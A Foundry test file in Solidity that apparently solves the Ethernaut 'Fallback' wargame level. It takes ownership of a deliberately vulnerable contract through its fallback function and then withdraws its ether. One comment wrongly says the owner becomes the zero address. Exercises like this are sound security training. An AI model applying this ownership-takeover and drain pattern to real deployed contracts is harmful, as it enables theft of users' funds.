pragma solidity ^0.8.10;

import "ds-test/test.sol";
import "../Fallback/FallbackFactory.sol";
import "../Ethernaut.sol";

interface CheatCodes {
  // Sets all subsequent calls' msg.sender to be the input address until `stopPrank` is called  
  function startPrank(address) external;
  // Resets subsequent calls' msg.sender to be `address(this)`
  function stopPrank() external;
  // Sets an address' balance
  function deal(address who, uint256 newBalance) external;
}

contract FallbackTest is DSTest {
    CheatCodes cheats = CheatCodes(address(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D));
    Ethernaut ethernaut;
    address eoaAddress = address(100);

    function setUp() public {
        // Setup instance of the Ethernaut contract
        ethernaut = new Ethernaut();
        // Deal EOA address some ether
        cheats.deal(eoaAddress, 5 ether);
    }

    function testFallbackHack() public {
        /////////////////
        // LEVEL SETUP //
        /////////////////

        FallbackFactory fallbackFactory = new FallbackFactory();
        ethernaut.registerLevel(fallbackFactory);
        cheats.startPrank(eoaAddress);
        address levelAddress = ethernaut.createLevelInstance(fallbackFactory);
        Fallback ethernautFallback = Fallback(payable(levelAddress));

        //////////////////
        // LEVEL ATTACK //
        //////////////////

        // Contribute 1 wei - verify contract state has been updated
        ethernautFallback.contribute{value: 1 wei}();
        assertEq(ethernautFallback.contributions(eoaAddress), 1 wei);

        // Call the contract with some value to hit the fallback function - .transfer doesn't send with enough gas to change the owner state
        payable(address(ethernautFallback)).call{value: 1 wei}("");
        // Verify contract owner has been updated to 0 address
        assertEq(ethernautFallback.owner(), eoaAddress);

        // Withdraw from contract - Check contract balance before and after
        emit log_named_uint("Fallback contract balance", address(ethernautFallback).balance);
        ethernautFallback.withdraw();
        emit log_named_uint("Fallback contract balance", address(ethernautFallback).balance);

        //////////////////////
        // LEVEL SUBMISSION //
        //////////////////////

        bool levelSuccessfullyPassed = ethernaut.submitLevelInstance(payable(levelAddress));
        cheats.stopPrank();
        assert(levelSuccessfullyPassed);
    }
}
